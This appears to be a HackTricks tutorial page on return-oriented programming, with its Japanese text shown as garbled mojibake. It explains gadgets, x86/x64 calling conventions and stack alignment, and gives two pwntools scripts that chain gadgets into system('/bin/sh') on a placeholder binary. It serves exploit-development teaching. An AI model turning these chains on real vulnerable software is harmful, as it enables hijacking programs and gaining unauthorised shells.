# ROP - Return Oriented Programing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **åŸºæœ¬æƒ…å ±**

**ãƒªã‚¿ãƒ¼ãƒ³æŒ‡å‘ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚° (ROP)** ã¯ã€**No-Execute (NX)** ã‚„ **ãƒ‡ãƒ¼ã‚¿å®Ÿè¡Œé˜²æ­¢ (DEP)** ã®ã‚ˆã†ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹é«˜åº¦ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆæŠ€è¡“ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¦å®Ÿè¡Œã™ã‚‹ä»£ã‚ã‚Šã«ã€ãƒã‚¤ãƒŠãƒªã‚„ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«æ—¢ã«å­˜åœ¨ã™ã‚‹ã‚³ãƒ¼ãƒ‰ã®æ–­ç‰‡ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ **ã€Œã‚¬ã‚¸ã‚§ãƒƒãƒˆã€** ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚å„ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯é€šå¸¸ `ret` å‘½ä»¤ã§çµ‚ã‚ã‚Šã€ãƒ¬ã‚¸ã‚¹ã‚¿é–“ã§ãƒ‡ãƒ¼ã‚¿ã‚’ç§»å‹•ã—ãŸã‚Šã€ç®—è¡“æ¼”ç®—ã‚’è¡Œã£ãŸã‚Šã™ã‚‹å°ã•ãªæ“ä½œã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’é€£é–ã•ã›ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ä»»æ„ã®æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ§‹ç¯‰ã—ã€NX/DEPä¿è­·ã‚’åŠ¹æœçš„ã«å›é¿ã—ã¾ã™ã€‚

### ROPã®å‹•ä½œ

1. **åˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã®ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯**: ã¾ãšã€æ”»æ’ƒè€…ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®åˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚é€šå¸¸ã¯ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’åˆ©ç”¨ã—ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ä¿å­˜ã•ã‚ŒãŸæˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¸Šæ›¸ãã—ã¾ã™ã€‚
2. **ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®é€£é–**: æ¬¡ã«ã€æ”»æ’ƒè€…ã¯ç›®çš„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æ…é‡ã«é¸æŠã—ã€é€£é–ã•ã›ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€é–¢æ•°å‘¼ã³å‡ºã—ã®å¼•æ•°ã‚’è¨­å®šã—ã€é–¢æ•°ã‚’å‘¼ã³å‡ºã—ï¼ˆä¾‹: `system("/bin/sh")`ï¼‰ã€å¿…è¦ãªã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã‚„è¿½åŠ ã®æ“ä½œã‚’å‡¦ç†ã™ã‚‹ã“ã¨ãŒå«ã¾ã‚Œã¾ã™ã€‚
3. **ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å®Ÿè¡Œ**: è„†å¼±ãªé–¢æ•°ãŒæˆ»ã‚‹ã¨ã€æ­£å½“ãªå ´æ‰€ã«æˆ»ã‚‹ã®ã§ã¯ãªãã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®é€£é–ã‚’å®Ÿè¡Œã—å§‹ã‚ã¾ã™ã€‚

### ãƒ„ãƒ¼ãƒ«

é€šå¸¸ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**ã€**[ropper](https://github.com/sashs/Ropper)** ã¾ãŸã¯ **pwntools** ã‹ã‚‰ç›´æ¥è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html))ã€‚

## x86ã®ROPãƒã‚§ãƒ¼ãƒ³ã®ä¾‹

### **x86 (32ãƒ“ãƒƒãƒˆ) å‘¼ã³å‡ºã—è¦ç´„**

* **cdecl**: å‘¼ã³å‡ºã—å…ƒãŒã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚é–¢æ•°å¼•æ•°ã¯é€†é †ï¼ˆå³ã‹ã‚‰å·¦ï¼‰ã§ã‚¹ã‚¿ãƒƒã‚¯ã«ãƒ—ãƒƒã‚·ãƒ¥ã•ã‚Œã¾ã™ã€‚**å¼•æ•°ã¯å³ã‹ã‚‰å·¦ã«ã‚¹ã‚¿ãƒƒã‚¯ã«ãƒ—ãƒƒã‚·ãƒ¥ã•ã‚Œã¾ã™ã€‚**
* **stdcall**: cdeclã«ä¼¼ã¦ã„ã¾ã™ãŒã€å‘¼ã³å‡ºã—å…ˆãŒã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã™ã‚‹è²¬ä»»ãŒã‚ã‚Šã¾ã™ã€‚

### **ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ç™ºè¦‹**

ã¾ãšã€ãƒã‚¤ãƒŠãƒªã¾ãŸã¯ãã®ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã§å¿…è¦ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç‰¹å®šã—ãŸã¨ä»®å®šã—ã¾ã™ã€‚ç§ãŸã¡ãŒèˆˆå‘³ã‚’æŒã£ã¦ã„ã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

* `pop eax; ret`: ã“ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã‚¹ã‚¿ãƒƒã‚¯ã®ãƒˆãƒƒãƒ—ã®å€¤ã‚’ `EAX` ãƒ¬ã‚¸ã‚¹ã‚¿ã«ãƒãƒƒãƒ—ã—ã€æ¬¡ã«æˆ»ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€`EAX` ã‚’åˆ¶å¾¡ã§ãã¾ã™ã€‚
* `pop ebx; ret`: ä¸Šè¨˜ã¨åŒæ§˜ã§ã™ãŒã€`EBX` ãƒ¬ã‚¸ã‚¹ã‚¿ç”¨ã§ã€`EBX` ã‚’åˆ¶å¾¡ã§ãã¾ã™ã€‚
* `mov [ebx], eax; ret`: `EAX` ã®å€¤ã‚’ `EBX` ãŒæŒ‡ã™ãƒ¡ãƒ¢ãƒªä½ç½®ã«ç§»å‹•ã—ã€æ¬¡ã«æˆ»ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã—ã°ã—ã° **write-what-where gadget** ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
* ã•ã‚‰ã«ã€`system()` é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚‚åˆ©ç”¨å¯èƒ½ã§ã™ã€‚

### **ROPãƒã‚§ãƒ¼ãƒ³**

**pwntools** ã‚’ä½¿ç”¨ã—ã¦ã€`system('/bin/sh')` ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚¹ã‚¿ãƒƒã‚¯ã‚’ROPãƒã‚§ãƒ¼ãƒ³å®Ÿè¡Œã®ãŸã‚ã«æº–å‚™ã—ã¾ã™ã€‚ãƒã‚§ãƒ¼ãƒ³ã¯æ¬¡ã®ã‚ˆã†ã«å§‹ã¾ã‚Šã¾ã™ã€‚

1. ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆç›®çš„ã®ãŸã‚ã® `ret` å‘½ä»¤ï¼ˆã‚ªãƒ—ã‚·ãƒ§ãƒ³ï¼‰
2. `system` é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆASLRãŒç„¡åŠ¹ã§ã€libcãŒæ—¢çŸ¥ã§ã‚ã‚‹ã¨ä»®å®šã€è©³ç´°ã¯ [**Ret2lib**](ret2lib/) ã‚’å‚ç…§ï¼‰
3. `system()` ã‹ã‚‰ã®æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã®ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ãƒ¼
4. `"/bin/sh"` æ–‡å­—åˆ—ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆsystemé–¢æ•°ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼‰
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

* Uses the **System V AMD64 ABI** calling convention on Unix-like systems, where the **æœ€åˆã®6ã¤ã®æ•´æ•°ã¾ãŸã¯ãƒã‚¤ãƒ³ã‚¿å¼•æ•°ã¯ã€ãƒ¬ã‚¸ã‚¹ã‚¿ `RDI`, `RSI`, `RDX`, `RCX`, `R8`, ãŠã‚ˆã³ `R9` ã«æ¸¡ã•ã‚Œã¾ã™**ã€‚è¿½åŠ ã®å¼•æ•°ã¯ã‚¹ã‚¿ãƒƒã‚¯ã«æ¸¡ã•ã‚Œã¾ã™ã€‚æˆ»ã‚Šå€¤ã¯ `RAX` ã«ç½®ã‹ã‚Œã¾ã™ã€‚
* **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.
* **Registers**: 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.

#### **Finding Gadgets**

For our purpose, let's focus on gadgets that will allow us to set the **RDI** register (to pass the **"/bin/sh"** string as an argument to **system()**) and then call the **system()** function. We'll assume we've identified the following gadgets:

* **pop rdi; ret**: Pops the top value of the stack into **RDI** and then returns. Essential for setting our argument for **system()**.
* **ret**: A simple return, useful for stack alignment in some scenarios.

And we know the address of the **system()** function.

### **ROP Chain**

Below is an example using **pwntools** to set up and execute a ROP chain aiming to execute **system('/bin/sh')** on **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* **`pop rdi; ret`** ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’åˆ©ç”¨ã—ã¦ **`RDI`** ã‚’ **`"/bin/sh"`** ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«è¨­å®šã—ã¾ã™ã€‚
* **`RDI`** ã‚’è¨­å®šã—ãŸå¾Œã€ãƒã‚§ãƒ¼ãƒ³å†…ã® **system()** ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ **`system()`** ã«ç›´æ¥ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* ã‚¿ãƒ¼ã‚²ãƒƒãƒˆç’°å¢ƒãŒå¿…è¦ã¨ã™ã‚‹å ´åˆã€**`ret_gadget`** ãŒã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆã®ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€é–¢æ•°ã‚’å‘¼ã³å‡ºã™å‰ã«é©åˆ‡ãªã‚¹ã‚¿ãƒƒã‚¯ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆã‚’ç¢ºä¿ã™ã‚‹ãŸã‚ã« **x64** ã§ã‚ˆã‚Šä¸€èˆ¬çš„ã§ã™ã€‚

### ã‚¹ã‚¿ãƒƒã‚¯ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆ

**x86-64 ABI** ã¯ã€**callå‘½ä»¤** ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ãã« **ã‚¹ã‚¿ãƒƒã‚¯ãŒ16ãƒã‚¤ãƒˆã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆ** ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚**LIBC** ã¯ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æœ€é©åŒ–ã™ã‚‹ãŸã‚ã«ã€**SSEå‘½ä»¤**ï¼ˆä¾‹ãˆã° **movaps**ï¼‰ã‚’ä½¿ç”¨ã—ã€ã“ã®ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆã‚’å¿…è¦ã¨ã—ã¾ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ãŒé©åˆ‡ã«ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆã•ã‚Œã¦ã„ãªã„å ´åˆï¼ˆã¤ã¾ã‚Š **RSP** ãŒ16ã®å€æ•°ã§ãªã„å ´åˆï¼‰ã€**ROPãƒã‚§ãƒ¼ãƒ³** ã§ã® **system** ã¸ã®å‘¼ã³å‡ºã—ã¯å¤±æ•—ã—ã¾ã™ã€‚ã“ã‚Œã‚’ä¿®æ­£ã™ã‚‹ã«ã¯ã€ROPãƒã‚§ãƒ¼ãƒ³ã§ **system** ã‚’å‘¼ã³å‡ºã™å‰ã« **ret gadget** ã‚’è¿½åŠ ã™ã‚‹ã ã‘ã§ã™ã€‚

## x86ã¨x64ã®ä¸»ãªé•ã„

{% hint style="success" %}
x64ã¯æœ€åˆã®ã„ãã¤ã‹ã®å¼•æ•°ã«ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã€å˜ç´”ãªé–¢æ•°å‘¼ã³å‡ºã—ã«ã¯x86ã‚ˆã‚Šã‚‚å°‘ãªã„ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’å¿…è¦ã¨ã™ã‚‹ã“ã¨ãŒå¤šã„ã§ã™ãŒã€ãƒ¬ã‚¸ã‚¹ã‚¿ã®æ•°ãŒå¢—ãˆã€ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ãŒå¤§ãããªã‚‹ãŸã‚ã€é©åˆ‡ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã¦ãƒã‚§ãƒ¼ãƒ³ã™ã‚‹ã“ã¨ã¯ã‚ˆã‚Šè¤‡é›‘ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**x64** ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã®æ•°ã®å¢—åŠ ã¨ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ã®æ‹¡å¤§ã¯ã€ç‰¹ã«ãƒªã‚¿ãƒ¼ãƒ³æŒ‡å‘ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ï¼ˆROPï¼‰ã®æ–‡è„ˆã«ãŠã„ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆé–‹ç™ºã«ã¨ã£ã¦æ©Ÿä¼šã¨èª²é¡Œã®ä¸¡æ–¹ã‚’æä¾›ã—ã¾ã™ã€‚
{% endhint %}

## ä¿è­·

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**ã‚¹ã‚¿ãƒƒã‚¯ã‚«ãƒŠãƒªã‚¢**](../common-binary-protections-and-bypasses/stack-canaries/)

## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROPãƒ™ãƒ¼ã‚¹ã®æŠ€è¡“

ROPã¯ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®æŠ€è¡“ã«éããªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ROPã«åŸºã¥ã„ã¦å¤šãã®Ret2XXXæŠ€è¡“ãŒé–‹ç™ºã•ã‚Œã¾ã—ãŸï¼š

* **Ret2lib**: ROPã‚’ä½¿ç”¨ã—ã¦ã€ä»»æ„ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‹ã‚‰ä»»æ„ã®é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã¾ã™ï¼ˆé€šå¸¸ã¯ `system('/bin/sh')` ã®ã‚ˆã†ãªã‚‚ã®ï¼‰ã€‚

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROPã‚’ä½¿ç”¨ã—ã¦ã€`execve` ãªã©ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™æº–å‚™ã‚’ã—ã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã¾ã™ã€‚

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBPãƒã‚§ã‚¤ãƒ‹ãƒ³ã‚°**: æœ€åˆã¯EIPã®ä»£ã‚ã‚Šã«EBPã‚’æ‚ªç”¨ã—ã¦ãƒ•ãƒ­ãƒ¼ã‚’åˆ¶å¾¡ã—ã€2ç•ªç›®ã¯Ret2libã«ä¼¼ã¦ã„ã¾ã™ãŒã€ã“ã®å ´åˆã¯ä¸»ã«EBPã‚¢ãƒ‰ãƒ¬ã‚¹ã§ãƒ•ãƒ­ãƒ¼ãŒåˆ¶å¾¡ã•ã‚Œã¾ã™ï¼ˆãŸã ã—EIPã‚‚åˆ¶å¾¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
